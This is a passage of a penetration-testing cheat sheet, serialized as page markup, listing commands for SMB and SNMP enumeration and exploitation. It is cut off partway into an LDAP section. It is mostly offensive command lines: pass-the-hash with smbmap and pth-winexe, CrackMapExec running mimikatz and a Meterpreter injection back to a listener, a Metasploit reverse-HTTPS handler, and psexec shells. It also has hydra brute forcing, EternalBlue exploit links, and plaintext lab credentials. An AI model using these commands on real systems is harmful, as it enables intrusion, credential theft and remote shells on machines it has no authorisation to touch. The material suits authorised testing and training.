--script=smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse -p445 $ip</code>"},{"type":"list_item","depth":4,"payload":{"lines":[628,629]},"content":"fuzzer - <code>nmap -sV -Pn -vv -p 445 –script=’(smb*) and not (brute or broadcast or dos or external or fuzzer)’ –script-args=unsafe=1 $ip</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[630,631]},"content":"smbmap","children":[{"type":"list_item","depth":4,"payload":{"lines":[631,632]},"content":"null - <code>smbmap -H $ip [-P &lt;PORT&gt;] #Null user</code>"},{"type":"list_item","depth":4,"payload":{"lines":[632,633]},"content":"creds - <code>smbmap -u &quot;username&quot; -p &quot;password&quot; -H $ip [-P &lt;PORT&gt;]</code>"},{"type":"list_item","depth":4,"payload":{"lines":[633,634]},"content":"anon - smbmap -H $ip -u 'anonymous' -p 'anonymous'"},{"type":"list_item","depth":4,"payload":{"lines":[634,635]},"content":"pass-the-hash - <code>smbmap -u &quot;username&quot; -p &quot;&lt;NT&gt;:&lt;LM&gt;&quot; -H $ip [-P &lt;PORT&gt;]</code>"},{"type":"list_item","depth":4,"payload":{"lines":[635,636]},"content":"Search for a file and download - <code>sudo smbmap -R Folder -H $ip -A &lt;FileName&gt; -q</code>"},{"type":"list_item","depth":4,"payload":{"lines":[636,637]},"content":"non-recursive list <code>smbmap -u sqlserver -p shantewhite -d XOR.COM -H 10.11.1.120</code>"},{"type":"list_item","depth":4,"payload":{"lines":[637,638]},"content":"recursive mode. download files inside /usr/share/smbmap - <code>smbmap [-u &quot;username&quot; -p &quot;password&quot;] -r [Folder] -H $ip [-P &lt;PORT&gt;]</code>"},{"type":"list_item","depth":4,"payload":{"lines":[638,639]},"content":"list everything - <code>smbmap [-u &quot;username&quot; -p &quot;password&quot;] -R [Folder] -H $ip [-P &lt;PORT&gt;]</code>"},{"type":"list_item","depth":4,"payload":{"lines":[639,640]},"content":"example - <code>smbmap -u sqlserver -p shantewhite -d XOR.COM -H 10.11.1.120</code>"},{"type":"list_item","depth":4,"payload":{"lines":[640,641]},"content":"example - <code>smbmap -H &quot;10.13.38.21&quot; | tee &quot;recon/smbmap_10.13.38.21.txt&quot;</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[642,643]},"content":"smbclient","children":[{"type":"list_item","depth":4,"payload":{"lines":[643,644]},"content":"<code>smbclient //MOUNT/share -I $ip -N</code>"},{"type":"list_item","depth":4,"payload":{"lines":[644,645]},"content":"<code>smbclient -L //$ip</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[646,647]},"content":"enum4linux","children":[{"type":"list_item","depth":4,"payload":{"lines":[647,648]},"content":"<code>enum4linux $ip</code>"},{"type":"list_item","depth":4,"payload":{"lines":[648,649]},"content":"<code>enum4linux -a $ip</code>"},{"type":"list_item","depth":4,"payload":{"lines":[649,650]},"content":"<code>enum4linux -n $ip</code>"},{"type":"list_item","depth":4,"payload":{"lines":[650,651]},"content":"<code>enum4linux -a $ip</code>"},{"type":"list_item","depth":4,"payload":{"lines":[651,652]},"content":"<code>enum4linux -a -u [user] -p [passwd] $ip</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[653,654]},"content":"wireshark","children":[{"type":"list_item","depth":4,"payload":{"lines":[654,655]},"content":"smb version and other information -"}]},{"type":"heading","depth":3,"payload":{"lines":[656,657]},"content":"smbget","children":[{"type":"list_item","depth":4,"payload":{"lines":[657,658]},"content":"requires creds - <code>smbget -U edgar.jacobs -P @3ONEmillionbaby smb://10.10.11.129/RedirectedFolders$/sierra.frye/Desktop/Phishing_Attempt.xlsx</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[659,660]},"content":"cifs","children":[{"type":"blockquote","depth":4,"payload":{"lines":[660,661]},"content":"","children":[{"type":"paragraph","depth":5,"payload":{"lines":[660,661]},"content":"NOTE » Mounting CIFS (Common Internet File System) is nothing but a advanced SMB file system implementation which support RAP (Remote Access Protocol)"}]},{"type":"bullet_list","depth":4,"payload":{"lines":[661,669]},"content":"","children":[{"type":"list_item","depth":5,"payload":{"lines":[661,662]},"content":"mount shares - <code>mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 &quot;//10.10.10.10/My Share&quot; /mnt/cifs</code>"},{"type":"list_item","depth":5,"payload":{"lines":[662,663]},"content":"mount share and grep for informations - <code>sudo mount -t cifs -o username=domainUser,domainn=domain.com //IP/SYSVOL</code>"},{"type":"list_item","depth":5,"payload":{"lines":[663,664]},"content":"example - <code>mount -t cifs //10.11.1.101/Bob\\ Share ./smb</code>"},{"type":"list_item","depth":5,"payload":{"lines":[664,665]},"content":"example - <code>mount –t cifs ipadd:/sharename /mountpoint –o username=userid,workgroup=workgroupname</code>"},{"type":"list_item","depth":5,"payload":{"lines":[665,666]},"content":"example - <code>mount –t cifs 192.168.0.1:/share1 /test –o username=Surendra,workgroup=test</code>"},{"type":"list_item","depth":5,"payload":{"lines":[666,667]},"content":"example - <code>mount -t smbfs -o username=userid,workgroup=workgroupname,password=XXXXX //ipadd/sharepoint /mountpoint/</code>"},{"type":"list_item","depth":5,"payload":{"lines":[667,668]},"content":"example - <code>mount –t smbfs –o username=Surendra,workgroup=test,password=xylBJRS8 //192.168.0.1/share1 /test</code>"}]}]},{"type":"heading","depth":3,"payload":{"lines":[669,670]},"content":"smbmount","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-shell\"><code class=\"language-shell\"><span class=\"token parameter variable\">-Type1</span> <span class=\"token builtin class-name\">:</span> Listing SMB shared folder through <span class=\"token builtin class-name\">command</span> prompt  \n<span class=\"token punctuation\">[</span><span class=\"token comment\">#smbclient](https://publish.obsidian.md/#smbclient) –L ipadd –U username  </span>\nHere –L will specify listing of SMB share <span class=\"token keyword\">for</span> the server with ipadd  \nOr  \n<span class=\"token punctuation\">[</span><span class=\"token comment\">#smbclient](https://publish.obsidian.md/#smbclient) //192.168.0.1/share1 –U username</span>\n\nExample <span class=\"token builtin class-name\">:</span>  \n<span class=\"token punctuation\">[</span><span class=\"token comment\">#smbclient](https://publish.obsidian.md/#smbclient) –L 192.168.0.1 –U root</span>\n\n<span class=\"token parameter variable\">-Type2</span> <span class=\"token builtin class-name\">:</span> Mounting SMB share on <span class=\"token builtin class-name\">local</span> folder by using smbmount <span class=\"token builtin class-name\">command</span>  \n<span class=\"token punctuation\">[</span><span class=\"token comment\">#smbmount](https://publish.obsidian.md/#smbmount) //ipadd/sharename /mountpoint –o username=userid,workgroup=workgroupname</span>\n\nExample <span class=\"token builtin class-name\">:</span>  \n<span class=\"token punctuation\">[</span><span class=\"token comment\">#smbmount](https://publish.obsidian.md/#smbmount) //192.168.0.1/share1 /mnt –o username=steev,workgroup=test</span>\n\n<span class=\"token parameter variable\">-Type3</span> <span class=\"token builtin class-name\">:</span> Mounting SMB share by using <span class=\"token function\">mount</span> <span class=\"token builtin class-name\">command</span>  \n<span class=\"token punctuation\">[</span><span class=\"token comment\">#mount](https://publish.obsidian.md/#mount) –t smbfs ipadd:/sharename /mountpoint –o username=userid,workgroup=workgroupname  </span>\nOr  \n<span class=\"token punctuation\">[</span><span class=\"token comment\">#mount](https://publish.obsidian.md/#mount) –t smbfs //ipadd/sharename /mountpoint –o username=userid,workgroup=workgroupname</span>\n\nExample <span class=\"token builtin class-name\">:</span>  \n<span class=\"token punctuation\">[</span><span class=\"token comment\">#mount](https://publish.obsidian.md/#mount) –t smbfs 192.168.0.1:/share1 /mnt –o username=surendra,workgroup=test</span>\n\n<span class=\"token parameter variable\">-Type4</span> <span class=\"token builtin class-name\">:</span> Mounting CIFS <span class=\"token punctuation\">(</span>Common Internet File System<span class=\"token punctuation\">)</span> is nothing but a advanced SMB <span class=\"token function\">file</span> system implementation <span class=\"token function\">which</span> support RAP <span class=\"token punctuation\">(</span>Remote Access Protocol<span class=\"token punctuation\">)</span>  \n<span class=\"token punctuation\">[</span><span class=\"token comment\">#mount](https://publish.obsidian.md/#mount) –t cifs ipadd:/sharename /mountpoint –o username=userid,workgroup=workgroupname</span>\n\nExample <span class=\"token builtin class-name\">:</span>  \n<span class=\"token punctuation\">[</span><span class=\"token comment\">#mount](https://publish.obsidian.md/#mount) –t cifs 192.168.0.1:/share1 /test –o username=Surendra,workgroup=test</span>\n\n<span class=\"token parameter variable\">-Type5</span> <span class=\"token builtin class-name\">:</span> All the above commands will ask password to display/mount the share name, however we can specify the password <span class=\"token keyword\">in</span> <span class=\"token builtin class-name\">command</span> it’self as below  \n<span class=\"token punctuation\">[</span><span class=\"token comment\">#mount](https://publish.obsidian.md/#mount) -t smbfs -o username=userid,workgroup=workgroupname,password=XXXXX //ipadd/sharepoint /mountpoint/</span>\n\nExample <span class=\"token builtin class-name\">:</span>  \n<span class=\"token punctuation\">[</span><span class=\"token comment\">#mount](https://publish.obsidian.md/#mount) –t smbfs –o username=Surendra,workgroup=test,password=xylBJRS8 //192.168.0.1/share1 /test</span>\n\n<span class=\"token parameter variable\">-Type6</span> <span class=\"token builtin class-name\">:</span> Mounting permanently by editing /etc/fstab file, below is the fstab <span class=\"token function\">file</span> entry example  \n<span class=\"token punctuation\">[</span><span class=\"token comment\">#vi](https://publish.obsidian.md/#vi) /etc/fstab//192.168.0.1/share1 /test smbfs rw,user,username=surendra,password=xylBJRS8 0 0  </span>\nSave and <span class=\"token builtin class-name\">exit</span> the <span class=\"token function\">file</span> and conform that you edited fstab <span class=\"token function\">file</span> properly. By below commands  \n<span class=\"token punctuation\">[</span><span class=\"token comment\">#mount](https://publish.obsidian.md/#mount) –a  </span>\nThis <span class=\"token builtin class-name\">command</span> should not throw any error,  \n<span class=\"token punctuation\">[</span><span class=\"token comment\">#df](https://publish.obsidian.md/#df) –H  </span>\nThis <span class=\"token builtin class-name\">command</span> should n <span class=\"token assign-left variable\">style</span><span class=\"token operator\">=</span><span class=\"token string\">\"font-size: small;\"</span><span class=\"token operator\">></span> show <span class=\"token function\">mount</span> from <span class=\"token number\">192.168</span>.0.1 server\n\n<span class=\"token parameter variable\">-Type7</span> <span class=\"token builtin class-name\">:</span> Mounting a share where user belongs to a domain permanently by editing /etc/fstab <span class=\"token function\">file</span>  \nThe above <span class=\"token builtin class-name\">command</span> will not work properly <span class=\"token keyword\">for</span> domain <span class=\"token function\">users</span> so we have to specify domain as well when specifying username  \nSo now username will be changed to domainusername  \n<span class=\"token punctuation\">[</span><span class=\"token comment\">#vi](https://publish.obsidian.md/#vi) /etc/fstab  </span>\n//192.168.0.1/share1 /mnt smbfs rw,user,username<span class=\"token operator\">=</span>testsurendra,password<span class=\"token operator\">=</span>xylBJRS8 <span class=\"token number\">0</span> <span class=\"token number\">0</span>  \nSave the <span class=\"token function\">file</span> and <span class=\"token builtin class-name\">exit</span> <span class=\"token keyword\">then</span> execute <span class=\"token function\">mount</span> –a and <span class=\"token function\">df</span> –H <span class=\"token keyword\">for</span> just conformation <span class=\"token keyword\">if</span> the <span class=\"token function\">mount</span> is <span class=\"token keyword\">done</span> successfully.\n\n-Type8: As you people know /etc/fstab <span class=\"token function\">file</span> is visible to all the <span class=\"token function\">users</span> <span class=\"token function\">who</span> logged in, so specifying user password <span class=\"token keyword\">in</span> /etc/fstab <span class=\"token function\">file</span> is not that much good procedure<span class=\"token punctuation\">..</span> So there is a work around to resolve this issue, just create a credential <span class=\"token function\">file</span> <span class=\"token keyword\">in</span> <span class=\"token function\">users</span> home directory and point that <span class=\"token function\">file</span> <span class=\"token keyword\">in</span> /etc/fstab <span class=\"token function\">file</span> entry as mention below.  \n\n<span class=\"token punctuation\">[</span><span class=\"token comment\">#cd](https://publish.obsidian.md/#cd) ~  </span>\n<span class=\"token punctuation\">[</span><span class=\"token comment\">#echo](https://publish.obsidian.md/#echo) username=surendra > .smbfile  </span>\n<span class=\"token punctuation\">[</span><span class=\"token comment\">#echo](https://publish.obsidian.md/#echo) password=xylBJRS8 >> .smbfile  </span>\n<span class=\"token punctuation\">[</span><span class=\"token comment\">#chmod](https://publish.obsidian.md/#chmod) 600 .smbfile</span>\n\nThen edit the /etc/fstab <span class=\"token function\">file</span> and specify the entries as below  \n<span class=\"token punctuation\">[</span><span class=\"token comment\">#vi](https://publish.obsidian.md/#vi) /etc/fstab  </span>\n\n//192.168.0.1/share1 /mnt smbfs <span class=\"token assign-left variable\">credentials</span><span class=\"token operator\">=</span>/home/myhomedirectoryofuser/. smbfile,rw,user <span class=\"token number\">0</span> <span class=\"token number\">0</span>  \n\nSave and <span class=\"token builtin class-name\">exit</span> the <span class=\"token function\">file</span> and execute <span class=\"token function\">mount</span> –a, <span class=\"token function\">df</span> –H to check <span class=\"token keyword\">if</span> you did any mistakes<span class=\"token punctuation\">..</span>\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[736,737]},"content":"amiga-smbfs","children":[{"type":"blockquote","depth":4,"payload":{"lines":[737,738]},"content":"","children":[{"type":"paragraph","depth":5,"payload":{"lines":[737,738]},"content":"https://github.com/obarthel/amiga-smbfs"}]},{"type":"bullet_list","depth":4,"payload":{"lines":[738,740]},"content":"","children":[{"type":"list_item","depth":5,"payload":{"lines":[738,739]},"content":"example - <code>mount –t smbfs 192.168.0.1:/share1 /mnt –o username=surendra,workgroup=test</code>"}]}]}]},{"type":"heading","depth":2,"payload":{"lines":[740,741]},"content":"Exploitation","children":[{"type":"heading","depth":3,"payload":{"lines":[741,742]},"content":"PrivEsc | fstab","children":[{"type":"list_item","depth":4,"payload":{"lines":[742,743]},"content":"<code>mount –t smbfs ipadd:/sharename /mountpoint –o username=userid,workgroup=workgroupname</code>"},{"type":"list_item","depth":4,"payload":{"lines":[743,744]},"content":"<code>mount –t smbfs //ipadd/sharename /mountpoint –o username=userid,workgroup=workgroupname</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[745,746]},"content":"PrivEsc | Crackmapexec (Using the database)","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">The database automatically store every hosts reaches by CME and all credentials with admin access $ cmedb \n</code></pre>\n"},{"type":"bullet_list","depth":4,"payload":{"lines":[749,759]},"content":"","children":[{"type":"list_item","depth":5,"payload":{"lines":[749,750]},"content":"Get credentials access for a specific account - <code>cmedb&gt; creds &lt;username&gt;</code>"},{"type":"list_item","depth":5,"payload":{"lines":[750,751]},"content":"Using credentials from the database - <code>crackmapexec smb 192.168.100.1 -id &lt;credsID&gt;</code>"},{"type":"list_item","depth":5,"payload":{"lines":[751,752]},"content":"Get stored credentials - <code>cmedb&gt; creds</code>"},{"type":"list_item","depth":5,"payload":{"lines":[752,753]},"content":"List stored hosts - <code>cmedb&gt; hosts</code>"},{"type":"list_item","depth":5,"payload":{"lines":[753,754]},"content":"Using workspaces - <code>cmedb&gt; workspace create test</code>"},{"type":"list_item","depth":5,"payload":{"lines":[754,755]},"content":"Using workspaces - <code>cmedb&gt; workspace test</code>"},{"type":"list_item","depth":5,"payload":{"lines":[755,756]},"content":"Access a protocol database and switch back - <code>cmedb (test)&gt; proto smb</code>"},{"type":"list_item","depth":5,"payload":{"lines":[756,757]},"content":"Access a protocol database and switch back - <code>cmedb (test)&gt; back</code>"},{"type":"list_item","depth":5,"payload":{"lines":[757,758]},"content":"View detailed infos for a specific machine (including creds) - <code>cmedb&gt; hosts &lt;hostname&gt;</code>"}]}]},{"type":"heading","depth":3,"payload":{"lines":[759,760]},"content":"PrivEsc | Crackmapexec (Using the Modules)","children":[{"type":"list_item","depth":4,"payload":{"lines":[760,761]},"content":"List available modules - <code>crackmapexec smb -L</code>"},{"type":"list_item","depth":4,"payload":{"lines":[761,762]},"content":"Module information - <code>crackmapexec smb -M mimikatz --module-info</code>"},{"type":"list_item","depth":4,"payload":{"lines":[762,763]},"content":"View module options - <code>crackmapexec smb -M mimikatz --options</code>"},{"type":"list_item","depth":4,"payload":{"lines":[763,764]},"content":"Mimikatz module - <code>crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth - M mimikatz</code>"},{"type":"list_item","depth":4,"payload":{"lines":[764,765]},"content":"Mimikatz module - <code>crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -M mimikatz</code>"},{"type":"list_item","depth":4,"payload":{"lines":[765,766]},"content":"Mimikatz module - <code>crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug</code>"},{"type":"list_item","depth":4,"payload":{"lines":[766,767]},"content":"Met_Inject module - <code>crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o LHOST=YOURIP LPORT=4444</code>"},{"type":"list_item","depth":4,"payload":{"lines":[767,768]},"content":"Metasploit MODULE - set up a HTTP Reverse Handler - <code>msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_https msf exploit(handler) &gt; set LHOST 192.168.10.3 msf exploit(handler) &gt; set exitonsession false msf exploit(handler) &gt; exploit -j</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[769,770]},"content":"PrivEsc | Impacket SMB/MSRPC tools","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">\n- lookupsids → SID Bruteforce through MSRPC Interface\n\n-  samrdump → SAM Remote Interface (MSRPC) to extract system users, available share etc.\n    python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip\n        - services → Used to (start, stop, delete, status, config, list, create, change) services through MSRPC interface\n\n- netview → Get a list of opened sessions and keep tracks of who logged in/off from remote targets\n\n- rpcdump → This script will dump the list of RPC endpoints and string bindings registered at the target.\n\n- Dump Users\n    impacket-rpcdump $ip\n\nreg → Remote registry manipulation tool through the [MS-RRP] MSRPC Interface.\n\ntool.py domain\\user:password@IP &lt;command/parameter> testparm\n    `systemd` generates mount units based on this file: `systemd.mount(5)`\n    NOTE: run 'systemctl daemon-reload' after making changes here.\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[792,793]},"content":"PrivEsc | BASH SCRIPT TO ESTABLISH A NULL SESSION:","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">#/bin/bash\n\nip='&lt;TARGET-IP-HERE>'\nshares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')\n\nfor share in ${shares[*]}; do\n    output=$(smbclient -U '%' -N \\\\\\\\$ip\\\\$share -c '') \n\n    if [[ -z $output ]]; then \n        echo \"[+] creating a null session is possible for $share\" # no output if command goes through, thus assuming that a session was created\n    else\n        echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)\n    fi\ndone\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[810,811]},"content":"nulllinux","children":[{"type":"list_item","depth":4,"payload":{"lines":[811,812]},"content":"<code>python3 nullinux.py -a 10.11.1.120</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[813,814]},"content":"msf","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">msf > use auxiliary/admin/smb/samba_symlink_traversal\nmsf auxiliary(samba_symlink_traversal) > show actions\n    ...actions...\nmsf auxiliary(samba_symlink_traversal) > set ACTION &lt; action-name >\nmsf auxiliary(samba_symlink_traversal) > show options\n    ...show and set options...\nmsf auxiliary(samba_symlink_traversal) > run\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[824,825]},"content":"Pop a shell","children":[{"type":"list_item","depth":4,"payload":{"lines":[825,826]},"content":"<code>psexec.py '&lt;username&gt;:&lt;password&gt;@$ip'</code>"},{"type":"list_item","depth":4,"payload":{"lines":[826,827]},"content":"<code>wmiexec.py '&lt;username&gt;:&lt;password&gt;@$ip'</code>"},{"type":"list_item","depth":4,"payload":{"lines":[827,828]},"content":"<code>winexe -U '&lt;username&gt;%&lt;password&gt;' //$ip cmd.exe</code>"},{"type":"list_item","depth":4,"payload":{"lines":[828,829]},"content":"<code>pth-winexe -U '&lt;username&gt;%&lt;lm_hash&gt;:&lt;nt_hash&gt;' //$ip cmd.exe</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[830,831]},"content":"SMB Exploitation | Default Creds","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">Try default creds \n    admin/admin, administrator/administrator, test/test, user/user, etc.,\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[836,837]},"content":"SMB Exploitation | Brute Force with HYDRA","children":[{"type":"list_item","depth":4,"payload":{"lines":[837,838]},"content":"<code>hydra -l root -P /usr/share/wordlists/rockyou.txt $ip smb -V</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[839,840]},"content":"SMB Exploitation | Common Exploits","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">MS08-067 (windows) - https://www.exploit-db.com/exploits/40279/\nSamba 2.2.7a (Linux) - https://www.exploit-db.com/exploits/10/\nEternalBlue (windows) - https://www.exploit-db.com/exploits/42315\nMS14-025\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[847,848]},"content":"SMB Exploitation | gpp-decrypt password","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">The following tool allows decryption\n\nhttps://github.com/lucasko/gpp-encrypt-decrypt\n    If you ever need to recreate this vulnerability\n\n You can encrypt a password using the following:\n    https://gchq.github.io/CyberChef/#recipe=AES_Encrypt(%7B'option':'Hex','string':'4e9906e8fcb66cc9faf49310620ffee8f49\n\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[861,862]},"content":"SMB Exploitation | Mounting permanently by editing /etc/fstab file","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">fstab file entry example\n    vi /etc/fstab//192.168.0.1/share1 /test smbfs rw,user,username=surendra,password=xylBJRS8 0 0\n\n    Save and exit the file and confirm that you edited fstab file properly. By below commands\n    mount –a\n\nThis command should not throw any error,\n    df –H\n    This command should show mount from $LHOST server\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[874,875]},"content":"SMB Exploitation | Mounting a share where user belongs to a domain permanently by editing /etc/fstab file","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">The above command will not work properly for domain users so we have to specify domain as well when specifying username\n> NOTE: username will be changed to domainusername\n\n1. \n    vi /etc/fstab\n    //192.168.0.1/share1 /mnt smbfs rw,user,username=testsurendra,password=xylBJRS8 0 0\n\n2. Save the file and exit then execute `mount –a and df –H` for just conformation if the mount is done successfully.\n\nNOTE:  `/etc/fstab` file is visible to all the users who have logged in, so specifying user password in /etc/fstab file is not recommended. Instead, create a `credential file` in users home directory and point that file to  the `/etc/fstab` file entry as mention below.\n\n    cd ~\n    echo username=surendra > .smbfile\n    echo password=xylBJRS8 >> .smbfile\n    chmod 600 .smbfile\n\n3. edit the `/etc/fstab` file and specify the entries as below\n\n    vi /etc/fstab\n    //192.168.0.1/share1 /mnt smbfs credentials=/home/myhomedirectoryofuser/. smbfile,rw,user 0 0\n\n4. Save and exit the file and execute \n    mount –a, df –H to check if you did any mistakes.\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[901,902]},"content":"psexec - Exploit SMB","children":[{"type":"list_item","depth":4,"payload":{"lines":[902,903]},"content":"gain access - <code>python psexec.py sqlServer:shantewhite@10.11.1.123</code>"},{"type":"list_item","depth":4,"payload":{"lines":[903,904]},"content":"gain access - <code>python psexec.py daisy:XorPasswordIsDead17@10.11.1.122</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[905,906]},"content":"Defend / Protect SMB","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">You can list active SMB sessions\n    C:> net session\n\nAnd kill them\n    C:> net session [LinuxIPaddr] /del\n</code></pre>\n"}]}]}]},{"type":"heading","depth":1,"payload":{"lines":[926,927]},"content":"161 » SNMP","children":[{"type":"heading","depth":2,"payload":{"lines":[927,928]},"content":"Enumeration","children":[{"type":"heading","depth":3,"payload":{"lines":[928,929]},"content":"nmap","children":[{"type":"list_item","depth":4,"payload":{"lines":[929,930]},"content":"<code>nmap --script snmp-info,snmp-brute,snmp-interfaces,snmp-processes,snmp-win32-users,snmp-win32-software,snmp-win32-shares,snmp-win32services &lt;victim_ip&gt; -p161</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[930,931]},"content":"netcat","children":[{"type":"list_item","depth":4,"payload":{"lines":[931,932]},"content":"<code>nc $IP 161</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[933,934]},"content":"telnet","children":[{"type":"list_item","depth":4,"payload":{"lines":[934,935]},"content":"<code>telnet $IP 161</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[936,937]},"content":"snmp enumeration commands","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">NOTE: Fix SNMP output values so they are human readable\n \n    apt-get install snmp-mibs-downloader download-mibs\n\n    echo \"\" > /etc/snmp/snmp.conf\n</code></pre>\n"},{"type":"bullet_list","depth":4,"payload":{"lines":[944,952]},"content":"","children":[{"type":"list_item","depth":5,"payload":{"lines":[944,945]},"content":"<code>snmpcheck -t $ip -c public</code>"},{"type":"list_item","depth":5,"payload":{"lines":[945,946]},"content":"<code>snmpwalk -c public -v1 $ip 1|</code>"},{"type":"list_item","depth":5,"payload":{"lines":[946,947]},"content":"<code>snmpwalk -c public -v1 10.0.0.0</code>"},{"type":"list_item","depth":5,"payload":{"lines":[947,948]},"content":"<code>grep hrSWRunName|cut -d\\* \\* -f</code>"},{"type":"list_item","depth":5,"payload":{"lines":[948,949]},"content":"<code>snmpenum -t $ip</code>"},{"type":"list_item","depth":5,"payload":{"lines":[949,950]},"content":"<code>onesixtyone -c names -i hosts</code>"},{"type":"list_item","depth":5,"payload":{"lines":[950,951]},"content":"<code>snmpenum -t 192.168.1.X</code>"}]}]},{"type":"heading","depth":3,"payload":{"lines":[952,953]},"content":"snmp enumeration commands | snmpwalk","children":[{"type":"list_item","depth":4,"payload":{"lines":[953,954]},"content":"Enumerating the Entire MIB Tree - <code>snmpwalk -c public -v1 10.11.1.72</code>"},{"type":"list_item","depth":4,"payload":{"lines":[954,955]},"content":"Enumerating Windows Users - <code>snmpwalk -c public -v1 10.11.1.72 1.3.6.1.4.1.77.1.2.25</code>"},{"type":"list_item","depth":4,"payload":{"lines":[955,956]},"content":"Enumerating Running Windows Processes - <code>snmpwalk -c public -v1 10.11.1.72 1.3.6.1.2.1.25.4.2.1.2</code>"},{"type":"list_item","depth":4,"payload":{"lines":[956,957]},"content":"Enumerating Open TCP Ports - <code>snmpwalk -c public -v1 10.11.1.72 1.3.6.1.2.1.6.13.1.3</code>"},{"type":"list_item","depth":4,"payload":{"lines":[957,958]},"content":"Enumerating Installed Software - <code>snmpwalk -c public -v1 10.11.1.72 1.3.6.1.2.1.25.6.3.1.2</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[959,960]},"content":"SNMPv3 Enumeration","children":[{"type":"heading","depth":4,"payload":{"lines":[960,961]},"content":"nmap","children":[{"type":"list_item","depth":5,"payload":{"lines":[961,962]},"content":"<code>nmap -sV -p 161 --script=snmp-info $ip/24</code>"},{"type":"list_item","depth":5,"payload":{"lines":[962,963]},"content":"<code>nmap -sT -p 161 192.168.X.X -oG snmp_results.txt</code>"}]},{"type":"heading","depth":4,"payload":{"lines":[964,965]},"content":"Automate the username enumeration process for SNMPv3","children":[{"type":"list_item","depth":5,"payload":{"lines":[965,966]},"content":"<code>apt-get install snmp snmp-mibs-downloader</code>"},{"type":"list_item","depth":5,"payload":{"lines":[966,967]},"content":"<code>wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb</code>"}]},{"type":"heading","depth":4,"payload":{"lines":[968,969]},"content":"SNMP Default Credentials","children":[{"type":"list_item","depth":5,"payload":{"lines":[969,970]},"content":"<code>/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt</code>"}]}]},{"type":"heading","depth":3,"payload":{"lines":[971,972]},"content":"Quick test of communities | onesixtyone","children":[{"type":"list_item","depth":4,"payload":{"lines":[972,973]},"content":"<code>onesixtyone &lt;victim_ip&gt; -c</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[974,975]},"content":"Full discovery of everything you can | snmpwalk","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\"># MIB-Management Information Base codes\n\n1.3.6.1.2.1.25.1.6.0 System Processes\n1.3.6.1.2.1.25.4.2.1.2 Running Programs\n1.3.6.1.2.1.25.4.2.1.4 Processes Path\n1.3.6.1.2.1.25.2.3.1.4 Storage Units\n1.3.6.1.2.1.25.6.3.1.2 Software Name\n1.3.6.1.4.1.77.1.2.25 User Accounts\n1.3.6.1.2.1.6.13.1.3 TCP Local Ports\n</code></pre>\n"}]}]},{"type":"heading","depth":2,"payload":{"lines":[989,990]},"content":"Exploitation:","children":[{"type":"fence","depth":3,"content":"<pre class=\"language-text\"><code class=\"language-text\">Check exploit-db.com for the latest exploits\n</code></pre>\n"}]}]},{"type":"heading","depth":1,"payload":{"lines":[994,995]},"content":"389 &amp; 636 LDAP","children":[{"type":"heading","depth":2,"payload":{"lines":[995,996]},"content":"Enumeration","children":[{"type":"heading","depth":3,"payload":{"lines":[996,997]},"content":"ldapsearch (Unauthenticated)","children":[{"type":"list_item","depth":4,"payload":{"lines":[997,998]},"content":"<code>ldapsearch -h $RHOST -x -s base 